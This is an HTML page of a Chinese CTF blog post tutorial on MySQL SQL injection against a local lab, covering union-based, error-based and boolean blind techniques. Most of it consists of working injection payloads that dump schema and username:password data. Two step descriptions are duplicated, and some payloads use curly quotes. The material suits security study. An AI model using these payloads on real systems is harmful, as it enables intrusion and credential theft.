@@ -1,0 +1,385 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>SQL注入（重构版） | C3ngH's B10g</title><meta name="author" content="C3ngH"><meta name="copyright" content="C3ngH"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="联合查询注入（回显正常） 找到注入点 通常是在应用程序的URL参数、表单字段、Cookie或HTTP标头中 测试注入点   提前闭合语句：使用&#39; &quot; )等符号将语句闭合，如果出现报错，则证明语句被提前闭合，确认注入点   构造简单语句：   构造?id&#x3D;-1 or 1&#x3D;1使得条件恒为正确，结果显示正常，确认注入点    注释符   单行注释（–）：   单行注释使用--，后面的内容会被视">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL注入（重构版）">
+<meta property="og:url" content="http://c3ngh.top/2024/07/15/newsql/index.html">
+<meta property="og:site_name" content="C3ngH&#39;s B10g">
+<meta property="og:description" content="联合查询注入（回显正常） 找到注入点 通常是在应用程序的URL参数、表单字段、Cookie或HTTP标头中 测试注入点   提前闭合语句：使用&#39; &quot; )等符号将语句闭合，如果出现报错，则证明语句被提前闭合，确认注入点   构造简单语句：   构造?id&#x3D;-1 or 1&#x3D;1使得条件恒为正确，结果显示正常，确认注入点    注释符   单行注释（–）：   单行注释使用--，后面的内容会被视">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/C3ngH.jpg">
+<meta property="article:published_time" content="2024-07-15T06:00:39.000Z">
+<meta property="article:modified_time" content="2024-07-15T07:51:02.954Z">
+<meta property="article:author" content="C3ngH">
+<meta property="article:tag" content="Web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/C3ngH.jpg"><link rel="shortcut icon" href="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/favicon.ico"><link rel="canonical" href="http://c3ngh.top/2024/07/15/newsql/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":true,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'SQL注入（重构版）',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-07-15 15:51:02'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/C3ngH.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">23</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">7</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/BGimg.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="C3ngH's B10g"><span class="site-name">C3ngH's B10g</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">SQL注入（重构版）</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-07-15T06:00:39.000Z" title="发表于 2024-07-15 14:00:39">2024-07-15</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-07-15T07:51:02.954Z" title="更新于 2024-07-15 15:51:02">2024-07-15</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/">CTF</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="SQL注入（重构版）"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h3 id="联合查询注入（回显正常）">联合查询注入（回显正常）</h3>
+<h4 id="找到注入点">找到注入点</h4>
+<p>通常是在应用程序的URL参数、表单字段、Cookie或HTTP标头中</p>
+<h4 id="测试注入点">测试注入点</h4>
+<ul>
+<li>
+<p>提前闭合语句：使用<code>'</code> <code>&quot;</code> <code>)</code>等符号将语句闭合，如果出现报错，则证明语句被提前闭合，确认注入点</p>
+</li>
+<li>
+<p>构造简单语句：</p>
+</li>
+<li>
+<p>构造<code>?id=-1 or 1=1</code>使得条件恒为正确，结果显示正常，确认注入点</p>
+<p><a target="_blank" rel="noopener" href="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240129145323028.png"><img src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240129145323028.png" alt="image-20240129145323028"></a></p>
+</li>
+</ul>
+<h4 id="注释符">注释符</h4>
+<ul>
+<li>
+<p><strong>单行注释（–）：</strong></p>
+<ul>
+<li>
+<p>单行注释使用<code>--</code>，后面的内容会被视为注释。</p>
+</li>
+<li>
+<p>示例：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="string">&#x27;admin&#x27;</span> <span class="comment">-- AND password = &#x27;123&#x27;;</span></span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+<li>
+<p>*<em>多行注释（/* <em>/）：</em></em></p>
+<ul>
+<li>
+<p>多行注释使用<code>/* */</code>，注释部分可以跨越多行。</p>
+</li>
+<li>
+<p>示例：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="string">&#x27;admin&#x27;</span> <span class="comment">/* AND password = &#x27;123&#x27; */</span>;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>MySQL特有的#号注释：</strong></p>
+<ul>
+<li>
+<p>MySQL支持使用<code>#</code>号作为单行注释，<strong>#的URL编码是%23</strong>。</p>
+</li>
+<li>
+<p>示例：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="string">&#x27;admin&#x27;</span> # <span class="keyword">AND</span> password <span class="operator">=</span> <span class="string">&#x27;123&#x27;</span>;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>+号在SQL中被编译为空格</strong></p>
+</li>
+</ul>
+<h4 id="确定字段">确定字段</h4>
+<p>构造<code>?id=-1 or 1=1 order by 4</code>确定columns只有3列</p>
+<p><a target="_blank" rel="noopener" href="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240129145704504.png"><img src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240129145704504.png" alt="image-20240129145704504"></a></p>
+<p>如果order by 后的数字小于等于有效列则会正常显示，如果大于有效列则会报错</p>
+<p><a target="_blank" rel="noopener" href="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240129145759615.png"><img src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240129145759615.png" alt="image-20240129145759615"></a></p>
+<h4 id="联合查询">联合查询</h4>
+<p>使用<code>?id=-1' union select 1,2,3--+</code>确定回显位置，可见在2，3处回显</p>
+<p><a target="_blank" rel="noopener" href="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240129150150075.png"><img src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240129150150075.png" alt="image-20240129150150075"></a></p>
+<ul>
+<li>查询当前数据库</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> database();</span><br><span class="line">#注意作为拼接语句时要去掉分号，作为完整语句时要加上分号</span><br></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener" href="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240129151212158.png"><img src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240129151212158.png" alt="image-20240129151212158"></a></p>
+<ul>
+<li>查询所有的数据库</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> group_concat(schema_name) <span class="keyword">from</span> information_schema.schemata;</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> schema_name <span class="keyword">from</span> information_schema.schemata limit <span class="number">0</span>,<span class="number">1</span>;</span><br></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener" href="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240129151347797.png"><img src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240129151347797.png" alt="image-20240129151347797"></a></p>
+<ul>
+<li>查询security的所有表名</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema <span class="operator">=</span> &quot;security&quot; limit <span class="number">0</span>,<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema <span class="operator">=</span> &quot;security&quot;;</span><br></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener" href="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240129151430020.png"><img src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240129151430020.png" alt="image-20240129151430020"></a></p>
+<ul>
+<li>查询users的所有字段</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.COLUMNS <span class="keyword">where</span> table_schema <span class="operator">=</span> &quot;security&quot; <span class="keyword">and</span> table_name<span class="operator">=</span>&quot;users&quot; limit <span class="number">0</span>,<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.COLUMNS <span class="keyword">where</span> table_name<span class="operator">=</span>&quot;users&quot;;</span><br></pre></td></tr></table></figure>
+<p>给出一个完整URL实例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:23334/Less-2/?id=-1%20union select 1,(select group_concat(column_name) from information_schema.COLUMNS where table_name=&quot;users&quot;),3</span><br></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener" href="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240129151455784.png"><img src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240129151455784.png" alt="image-20240129151455784"></a></p>
+<ul>
+<li>查询security.user的所有数据</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> group_concat(username,<span class="string">&#x27;:&#x27;</span>,password,<span class="string">&#x27;&lt;/br&gt;&#x27;</span>) <span class="keyword">from</span> users</span><br></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener" href="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240129151556998.png"><img src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240129151556998.png" alt="image-20240129151556998"></a></p>
+<h3 id="报错注入（只回显异常）">报错注入（只回显异常）</h3>
+<h4 id="floor-函数"><strong>floor() 函数</strong></h4>
+<p><code>floor()</code> 函数通常用于取整，它在一些情况下会触发数据库的错误信息，从而泄露数据库的信息。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat(database(),<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a)</span><br></pre></td></tr></table></figure>
+<h4 id="extractvalue-函数"><strong>extractvalue() 函数</strong></h4>
+<p><code>extractvalue()</code> 是一个XML函数，它用于从XML数据中提取值。当提供的XPath表达式无效时，会触发错误。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> extractvalue(<span class="number">1</span>, CONCAT(<span class="number">0x7e</span>, (<span class="keyword">SELECT</span> version()), <span class="number">0x7e</span>));</span><br></pre></td></tr></table></figure>
+<h4 id="updatexml-函数"><strong>updatexml() 函数</strong></h4>
+<p><code>updatexml()</code> 也是一个XML函数，用于更新XML数据中的值。当提供的XPath表达式无效时，同样会触发错误。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> updatexml(<span class="keyword">null</span>, CONCAT(<span class="number">0x7e</span>, (<span class="keyword">SELECT</span> <span class="keyword">user</span>()), <span class="number">0x7e</span>), <span class="keyword">null</span>);</span><br></pre></td></tr></table></figure>
+<h3 id="布尔盲注（只返回查询是否成功）">布尔盲注（只返回查询是否成功）</h3>
+<h4 id="常用函数">常用函数</h4>
+<ul>
+<li><code>substr(str,from,length)</code>:返回从下标为from截取长度为length的str子串。<strong>其中，首字符下标为1</strong></li>
+<li><code>length(str)</code>:返回str串长度</li>
+</ul>
+<h4 id="盲注步骤">盲注步骤</h4>
+<ul>
+<li>
+<p><strong>爆破数据库名长度</strong></p>
+<p>首先，通过循环i从1到无穷，使用<code>length(database()) = i</code>获取库名长度，i是长度，直到返回页面提示<code>query_success</code>即猜测成功</p>
+</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> length(database())<span class="operator">=</span><span class="number">1</span></span><br><span class="line">#query_error</span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> length(database())<span class="operator">=</span><span class="number">4</span></span><br><span class="line">#query_success</span><br><span class="line"></span><br><span class="line">#库名长度为<span class="number">4</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>
+<p><strong>根据库名长度爆破库名</strong></p>
+<p>获得库名长度i后，使用<code>substr(database(),i,1)</code>将库名切片，循环i次，i是字符下标，每次循环要遍历字母表[a-z]作比较，即依次猜每位字符</p>
+</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> substr(database(),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span>‘a’</span><br><span class="line">#query_error</span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> substr(database(),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span>‘s’</span><br><span class="line">#query_success</span><br><span class="line">#库名第一个字符是s</span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> substr(database(),<span class="number">4</span>,<span class="number">1</span>)<span class="operator">=</span>‘i’</span><br><span class="line">#query_success</span><br><span class="line">#库名第四个字符是i</span><br><span class="line"></span><br><span class="line">#库名是sqli</span><br></pre></td></tr></table></figure>
+<ul>
+<li>
+<p><strong>对当前库爆破表数量</strong></p>
+<p>下一步是获取数据库内的表数量，使用mysql的查询语句select COUNT(*)。同样，要一个1到无穷的循环</p>
+</li>
+</ul>
+<p>3、对当前库爆表数量<br>
+下一步是获取数据库内的表数量，使用mysql的查询语句select COUNT(*)。同样，要一个1到无穷的循环</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database())<span class="operator">=</span><span class="number">1</span></span><br><span class="line">#query_error</span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database())<span class="operator">=</span><span class="number">2</span></span><br><span class="line">#query_success</span><br><span class="line"> </span><br><span class="line">#当前库sqli有<span class="number">2</span>张表</span><br></pre></td></tr></table></figure>
+<ul>
+<li>
+<p><strong>根据库名和表数量爆破表名长度</strong></p>
+<p>得到表数量i后，i就是循环次数，i是表的下标-1，大循环i次（遍历所有表），这里的i从0开始，使用limit i ,1限定是第几张表，内嵌循环j从1到无穷（穷举所有表名长度可能性）尝试获取每个表的表名长度</p>
+</li>
+</ul>
+<p>4、根据库名和表数量爆表名长度<br>
+得到表数量i后，i就是循环次数，i是表的下标-1，大循环i次（遍历所有表），这里的i从0开始，使用limit i ,1限定是第几张表，内嵌循环j从1到无穷（穷举所有表名长度可能性）尝试获取每个表的表名长度</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> length(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>)<span class="operator">=</span><span class="number">1</span></span><br><span class="line">#query_error</span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> length(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>)<span class="operator">=</span><span class="number">4</span></span><br><span class="line">#query_success</span><br><span class="line">#当前库sqli的第一张表表名长度为<span class="number">4</span></span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> length(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="number">4</span></span><br><span class="line">#query_success</span><br><span class="line">#当前库sqli的第二张表表名长度为<span class="number">4</span></span><br><span class="line"></span><br><span class="line">#当前库sqli有两张表’news’和’flag‘，表名长度均为<span class="number">4</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>
+<p><strong>根据表名长度爆破表名</strong></p>
+<p>再大循环i次（遍历所有表），内嵌循环j次（表名的所有字符），i是表下标-1，j是字符下标，再内嵌循环k从a到z（假设表名全是小写英文字符）尝试获取每个表的表名</p>
+</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span>‘a’</span><br><span class="line">#query_error</span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span>‘n’</span><br><span class="line">#query_success</span><br><span class="line">#当前库sqli的第一张表表名第一个字符是n</span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">1</span>,<span class="number">1</span>),<span class="number">4</span>,<span class="number">1</span>)<span class="operator">=</span>‘g’</span><br><span class="line">#query_success</span><br><span class="line">#当前库sqli的第二张表表名的第四个字符是g</span><br><span class="line"></span><br><span class="line">#当前库sqli有两张表’news‘和‘flag’</span><br></pre></td></tr></table></figure>
+<ul>
+<li>
+<p><strong>对表爆破字段数量</strong></p>
+<p>操作同对当前库爆表数量的步骤，只是要查询的表不同</p>
+</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database() <span class="keyword">and</span> table_name<span class="operator">=</span>‘flag’)<span class="operator">=</span><span class="number">1</span></span><br><span class="line">#query_error</span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database() <span class="keyword">and</span> table_name<span class="operator">=</span>‘flag’)<span class="operator">=</span><span class="number">2</span></span><br><span class="line">#query_success</span><br><span class="line">#当前库sqli表flag的列数为<span class="number">2</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>
+<p>根据表名和列数量爆列名长度</p>
+<p>操作同对当前库爆表名长度的步骤，i是列标-1</p>
+</li>
+</ul>
